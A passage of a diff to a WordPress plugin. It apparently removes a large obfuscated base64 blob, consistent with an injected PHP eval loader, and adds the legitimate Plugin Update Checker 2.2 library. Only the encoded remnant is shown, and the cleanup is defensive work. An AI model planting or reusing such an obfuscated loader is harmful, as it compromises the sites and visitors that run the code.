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'\x29\x29\x29\x3B");
-?>
+/**
+ * Plugin Update Checker Library 2.2.0
+ * http://w-shadow.com/
+ * 
+ * Copyright 2015 Janis Elsts
+ * Released under the MIT license. See license.txt for details.
+ */
+
+if ( !class_exists('PluginUpdateChecker_2_2', false) ):
+
+/**
+ * A custom plugin update checker. 
+ * 
+ * @author Janis Elsts
+ * @copyright 2015
+ * @version 2.2
+ * @access public
+ */
+class PluginUpdateChecker_2_2 {
+	public $metadataUrl = ''; //The URL of the plugin's metadata file.
+	public $pluginAbsolutePath = ''; //Full path of the main plugin file.
+	public $pluginFile = '';  //Plugin filename relative to the plugins directory. Many WP APIs use this to identify plugins.
+	public $slug = '';        //Plugin slug.
+	public $checkPeriod = 12; //How often to check for updates (in hours).
+	public $optionName = '';  //Where to store the update info.
+	public $muPluginFile = ''; //For MU plugins, the plugin filename relative to the mu-plugins directory.
+
+	public $debugMode = false; //Set to TRUE to enable error reporting. Errors are raised using trigger_error()
+                               //and should be logged to the standard PHP error log.
+
+	public $throttleRedundantChecks = false; //Check less often if we already know that an update is available.
+	public $throttledCheckPeriod = 72;
+
+	private $cronHook = null;
+	private $debugBarPlugin = null;
+	private $cachedInstalledVersion = null;
+
+	private $upgradedPluginFile = null; //The plugin that is currently being upgraded by WordPress.
+
+	/**
+	 * Class constructor.
+	 *
+	 * @param string $metadataUrl The URL of the plugin's metadata file.
+	 * @param string $pluginFile Fully qualified path to the main plugin file.
+	 * @param string $slug The plugin's 'slug'. If not specified, the filename part of $pluginFile sans '.php' will be used as the slug.
+	 * @param integer $checkPeriod How often to check for updates (in hours). Defaults to checking every 12 hours. Set to 0 to disable automatic update checks.
+	 * @param string $optionName Where to store book-keeping info about update checks. Defaults to 'external_updates-$slug'.
+	 * @param string $muPluginFile Optional. The plugin filename relative to the mu-plugins directory.
+	 */
+	public function __construct($metadataUrl, $pluginFile, $slug = '', $checkPeriod = 12, $optionName = '', $muPluginFile = ''){
+		$this->metadataUrl = $metadataUrl;
+		$this->pluginAbsolutePath = $pluginFile;
+		$this->pluginFile = plugin_basename($this->pluginAbsolutePath);
+		$this->muPluginFile = $muPluginFile;
+		$this->checkPeriod = $checkPeriod;
+		$this->slug = $slug;
+		$this->optionName = $optionName;
+		$this->debugMode = defined('WP_DEBUG') && WP_DEBUG;
+
+		//If no slug is specified, use the name of the main plugin file as the slug.
+		//For example, 'my-cool-plugin/cool-plugin.php' becomes 'cool-plugin'.
+		if ( empty($this->slug) ){
+			$this->slug = basename($this->pluginFile, '.php');
+		}
+		
+		if ( empty($this->optionName) ){
+			$this->optionName = 'external_updates-' . $this->slug;
+		}
+
+		//Backwards compatibility: If the plugin is a mu-plugin but no $muPluginFile is specified, assume
+		//it's the same as $pluginFile given that it's not in a subdirectory (WP only looks in the base dir).
+		if ( empty($this->muPluginFile) && (strpbrk($this->pluginFile, '/\\') === false) && $this->isMuPlugin() ) {
+			$this->muPluginFile = $this->pluginFile;
+		}
+		
+		$this->installHooks();
+	}
+	
+	/**
+	 * Install the hooks required to run periodic update checks and inject update info 
+	 * into WP data structures. 
+	 * 
+	 * @return void
+	 */
+	protected function installHooks(){
+		//Override requests for plugin information
+		add_filter('plugins_api', array($this, 'injectInfo'), 20, 3);
+		
+		//Insert our update info into the update array maintained by WP
+		add_filter('site_transient_update_plugins', array($this,'injectUpdate')); //WP 3.0+
+		add_filter('transient_update_plugins', array($this,'injectUpdate')); //WP 2.8+
+
+		add_filter('plugin_row_meta', array($this, 'addCheckForUpdatesLink'), 10, 2);
+		add_action('admin_init', array($this, 'handleManualCheck'));
+		add_action('all_admin_notices', array($this, 'displayManualCheckResult'));
+
+		//Clear the version number cache when something - anything - is upgraded or WP clears the update cache.
+		add_filter('upgrader_post_install', array($this, 'clearCachedVersion'));
+		add_action('delete_site_transient_update_plugins', array($this, 'clearCachedVersion'));
+
+		//Set up the periodic update checks
+		$this->cronHook = 'check_plugin_updates-' . $this->slug;
+		if ( $this->checkPeriod > 0 ){
+			
+			//Trigger the check via Cron.
+			//Try to use one of the default schedules if possible as it's less likely to conflict
+			//with other plugins and their custom schedules.
+			$defaultSchedules = array(
+				1  => 'hourly',
+				12 => 'twicedaily',
+				24 => 'daily',
+			);
+			if ( array_key_exists($this->checkPeriod, $defaultSchedules) ) {
+				$scheduleName = $defaultSchedules[$this->checkPeriod];
+			} else {
+				//Use a custom cron schedule.
+				$scheduleName = 'every' . $this->checkPeriod . 'hours';
+				add_filter('cron_schedules', array($this, '_addCustomSchedule'));
+			}
+
+			if ( !wp_next_scheduled($this->cronHook) && !defined('WP_INSTALLING') ) {
+				wp_schedule_event(time(), $scheduleName, $this->cronHook);
+			}
+			add_action($this->cronHook, array($this, 'maybeCheckForUpdates'));
+			
+			register_deactivation_hook($this->pluginFile, array($this, '_removeUpdaterCron'));
+			
+			//In case Cron is disabled or unreliable, we also manually trigger 
+			//the periodic checks while the user is browsing the Dashboard. 
+			add_action( 'admin_init', array($this, 'maybeCheckForUpdates') );
+
+			//Like WordPress itself, we check more often on certain pages.
+			/** @see wp_update_plugins */
+			add_action('load-update-core.php', array($this, 'maybeCheckForUpdates'));
+			add_action('load-plugins.php', array($this, 'maybeCheckForUpdates'));
+			add_action('load-update.php', array($this, 'maybeCheckForUpdates'));
+			//This hook fires after a bulk update is complete.
+			add_action('upgrader_process_complete', array($this, 'maybeCheckForUpdates'), 11, 0);
+
+		} else {
+			//Periodic checks are disabled.
+			wp_clear_scheduled_hook($this->cronHook);
+		}
+
+		if ( did_action('plugins_loaded') ) {
+			$this->initDebugBarPanel();
+		} else {
+			add_action('plugins_loaded', array($this, 'initDebugBarPanel'));
+		}
+
+		//Rename the update directory to be the same as the existing directory.
+		add_filter('upgrader_source_selection', array($this, 'fixDirectoryName'), 10, 3);
+
+		//Keep track of which plugin WordPress is currently upgrading.
+		add_filter('upgrader_pre_install', array($this, 'setUpgradedPlugin'), 10, 2);
+		add_filter('upgrader_post_install', array($this, 'clearUpgradedPlugin'), 10, 1);
+		add_action('upgrader_process_complete', array($this, 'clearUpgradedPlugin'), 10, 1);
+	}
+	
+	/**
+	 * Add our custom schedule to the array of Cron schedules used by WP.
+	 * 
+	 * @param array $schedules
+	 * @return array
+	 */
+	public function _addCustomSchedule($schedules){
+		if ( $this->checkPeriod && ($this->checkPeriod > 0) ){
+			$scheduleName = 'every' . $this->checkPeriod . 'hours';
+			$schedules[$scheduleName] = array(
+				'interval' => $this->checkPeriod * 3600, 
+				'display' => sprintf('Every %d hours', $this->checkPeriod),
+			);
+		}
+		return $schedules;
+	}
+
+	/**
+	 * Remove the scheduled cron event that the library uses to check for updates.
+	 *
+	 * @return void
+	 */
+	public function _removeUpdaterCron(){
+		wp_clear_scheduled_hook($this->cronHook);
+	}
+
+	/**
+	 * Get the name of the update checker's WP-cron hook. Mostly useful for debugging.
+	 *
+	 * @return string
+	 */
+	public function getCronHookName() {
+		return $this->cronHook;
+	}
+	
+	/**
+	 * Retrieve plugin info from the configured API endpoint.
+	 * 
+	 * @uses wp_remote_get()
+	 * 
+	 * @param array $queryArgs Additional query arguments to append to the request. Optional.
+	 * @return PluginInfo
+	 */
+	public function requestInfo($queryArgs = array()){
+		//Query args to append to the URL. Plugins can add their own by using a filter callback (see addQueryArgFilter()).
+		$installedVersion = $this->getInstalledVersion();
+		$queryArgs['installed_version'] = ($installedVersion !== null) ? $installedVersion : '';
+		$queryArgs = apply_filters('puc_request_info_query_args-'.$this->slug, $queryArgs);
+		
+		//Various options for the wp_remote_get() call. Plugins can filter these, too.
+		$options = array(
+			'timeout' => 10, //seconds
+			'headers' => array(
+				'Accept' => 'application/json'
+			),
+		);
+		$options = apply_filters('puc_request_info_options-'.$this->slug, $options);
+		
+		//The plugin info should be at 'http://your-api.com/url/here/$slug/info.json'
+		$url = $this->metadataUrl; 
+		if ( !empty($queryArgs) ){
+			$url = add_query_arg($queryArgs, esc_url_raw($url));
+		}
+		
+		$result = wp_remote_get(
+			$url,
+			$options
+		);
+
+		//Try to parse the response
+		$pluginInfo = null;
+		if ( !is_wp_error($result) && isset($result['response']['code']) && ($result['response']['code'] == 200) && !empty($result['body']) ){
+			$pluginInfo = PluginInfo_2_2::fromJson($result['body'], $this->debugMode);
+			$pluginInfo->filename = $this->pluginFile;
+			$pluginInfo->slug = $this->slug;
+		} else if ( $this->debugMode ) {
+			$message = sprintf("The URL %s does not point to a valid plugin metadata file. ", $url);
+			if ( is_wp_error($result) ) {
+				$message .= "WP HTTP error: " . $result->get_error_message();
+			} else if ( isset($result['response']['code']) ) {
+				$message .= "HTTP response code is " . $result['response']['code'] . " (expected: 200)";
+			} else {
+				$message .= "wp_remote_get() returned an unexpected result.";
+			}
+			trigger_error($message, E_USER_WARNING);
+		}
+
+		$pluginInfo = apply_filters('puc_request_info_result-'.$this->slug, $pluginInfo, $result);
+		return $pluginInfo;
+	}
+
+	/**
+	 * Retrieve the latest update (if any) from the configured API endpoint.
+	 *
+	 * @uses PluginUpdateChecker::requestInfo()
+	 *
+	 * @return PluginUpdate An instance of PluginUpdate, or NULL when no updates are available.
+	 */
+	public function requestUpdate(){
+		//For the sake of simplicity, this function just calls requestInfo() 
+		//and transforms the result accordingly.
+		$pluginInfo = $this->requestInfo(array('checking_for_updates' => '1'));
+		if ( $pluginInfo == null ){
+			return null;
+		}
+		return PluginUpdate_2_2::fromPluginInfo($pluginInfo);
+	}
+	
+	/**
+	 * Get the currently installed version of the plugin.
+	 * 
+	 * @return string Version number.
+	 */
+	public function getInstalledVersion(){
+		if ( isset($this->cachedInstalledVersion) ) {
+			return $this->cachedInstalledVersion;
+		}
+
+		$pluginHeader = $this->getPluginHeader();
+		if ( isset($pluginHeader['Version']) ) {
+			$this->cachedInstalledVersion = $pluginHeader['Version'];
+			return $pluginHeader['Version'];
+		} else {
+			//This can happen if the filename points to something that is not a plugin.
+			if ( $this->debugMode ) {
+				trigger_error(
+					sprintf(
+						"Can't to read the Version header for '%s'. The filename is incorrect or is not a plugin.",
+						$this->pluginFile
+					),
+					E_USER_WARNING
+				);
+			}
+			return null;
+		}
+	}
+
+	/**
+	 * Get plugin's metadata from its file header.
+	 *
+	 * @return array
+	 */
+	protected function getPluginHeader() {
+		if ( !is_file($this->pluginAbsolutePath) ) {
+			//This can happen if the plugin filename is wrong.
+			if ( $this->debugMode ) {
+				trigger_error(
+					sprintf(
+						"Can't to read the plugin header for '%s'. The file does not exist.",
+						$this->pluginFile
+					),
+					E_USER_WARNING
+				);
+			}
+			return array();
+		}
+
+		if ( !function_exists('get_plugin_data') ){
+			require_once( ABSPATH . '/wp-admin/includes/plugin.php' );
+		}
+		return get_plugin_data($this->pluginAbsolutePath, false, false);
+	}
+
+	/**
+	 * Check for plugin updates.
+	 * The results are stored in the DB option specified in $optionName.
+	 *
+	 * @return PluginUpdate|null
+	 */
+	public function checkForUpdates(){
+		$installedVersion = $this->getInstalledVersion();
+		//Fail silently if we can't find the plugin or read its header.
+		if ( $installedVersion === null ) {
+			if ( $this->debugMode ) {
+				trigger_error(
+					sprintf('Skipping update check for %s - installed version unknown.', $this->pluginFile),
+					E_USER_WARNING
+				);
+			}
+			return null;
+		}
+
+		$state = $this->getUpdateState();
+		if ( empty($state) ){
+			$state = new StdClass;
+			$state->lastCheck = 0;
+			$state->checkedVersion = '';
+			$state->update = null;
+		}
+		
+		$state->lastCheck = time();
+		$state->checkedVersion = $installedVersion;
+		$this->setUpdateState($state); //Save before checking in case something goes wrong 
+		
+		$state->update = $this->requestUpdate();
+		$this->setUpdateState($state);
+
+		return $this->getUpdate();
+	}
+	
+	/**
+	 * Check for updates if the configured check interval has already elapsed.
+	 * Will use a shorter check interval on certain admin pages like "Dashboard -> Updates" or when doing cron.
+	 *
+	 * You can override the default behaviour by using the "puc_check_now-$slug" filter.
+	 * The filter callback will be passed three parameters:
+	 *     - Current decision. TRUE = check updates now, FALSE = don't check now.
+	 *     - Last check time as a Unix timestamp.
+	 *     - Configured check period in hours.
+	 * Return TRUE to check for updates immediately, or FALSE to cancel.
+	 *
+	 * This method is declared public because it's a hook callback. Calling it directly is not recommended.
+	 */
+	public function maybeCheckForUpdates(){
+		if ( empty($this->checkPeriod) ){
+			return;
+		}
+
+		$currentFilter = current_filter();
+		if ( in_array($currentFilter, array('load-update-core.php', 'upgrader_process_complete')) ) {
+			//Check more often when the user visits "Dashboard -> Updates" or does a bulk update.
+			$timeout = 60;
+		} else if ( in_array($currentFilter, array('load-plugins.php', 'load-update.php')) ) {
+			//Also check more often on the "Plugins" page and /wp-admin/update.php.
+			$timeout = 3600;
+		} else if ( $this->throttleRedundantChecks && ($this->getUpdate() !== null) ) {
+			//Check less frequently if it's already known that an update is available.
+			$timeout = $this->throttledCheckPeriod * 3600;
+		} else if ( defined('DOING_CRON') && constant('DOING_CRON') ) {
+			//WordPress cron schedules are not exact, so lets do an update check even
+			//if slightly less than $checkPeriod hours have elapsed since the last check.
+			$cronFuzziness = 20 * 60;
+			$timeout = $this->checkPeriod * 3600 - $cronFuzziness;
+		} else {
+			$timeout = $this->checkPeriod * 3600;
+		}
+
+		$state = $this->getUpdateState();
+		$shouldCheck =
+			empty($state) ||
+			!isset($state->lastCheck) ||
+			( (time() - $state->lastCheck) >= $timeout );
+
+		//Let plugin authors substitute their own algorithm.
+		$shouldCheck = apply_filters(
+			'puc_check_now-' . $this->slug,
+			$shouldCheck,
+			(!empty($state) && isset($state->lastCheck)) ? $state->lastCheck : 0,
+			$this->checkPeriod
+		);
+
+		if ( $shouldCheck ){
+			$this->checkForUpdates();
+		}
+	}
+	
+	/**
+	 * Load the update checker state from the DB.
+	 *  
+	 * @return StdClass|null
+	 */
+	public function getUpdateState() {
+		$state = get_site_option($this->optionName, null);
+		if ( empty($state) || !is_object($state)) {
+			$state = null;
+		}
+
+		if ( !empty($state) && isset($state->update) && is_object($state->update) ){
+			$state->update = PluginUpdate_2_2::fromObject($state->update);
+		}
+		return $state;
+	}
+	
+	
+	/**
+	 * Persist the update checker state to the DB.
+	 * 
+	 * @param StdClass $state
+	 * @return void
+	 */
+	private function setUpdateState($state) {
+		if ( isset($state->update) && is_object($state->update) && method_exists($state->update, 'toStdClass') ) {
+			$update = $state->update; /** @var PluginUpdate $update */
+			$state->update = $update->toStdClass();
+		}
+		update_site_option($this->optionName, $state);
+	}
+
+	/**
+	 * Reset update checker state - i.e. last check time, cached update data and so on.
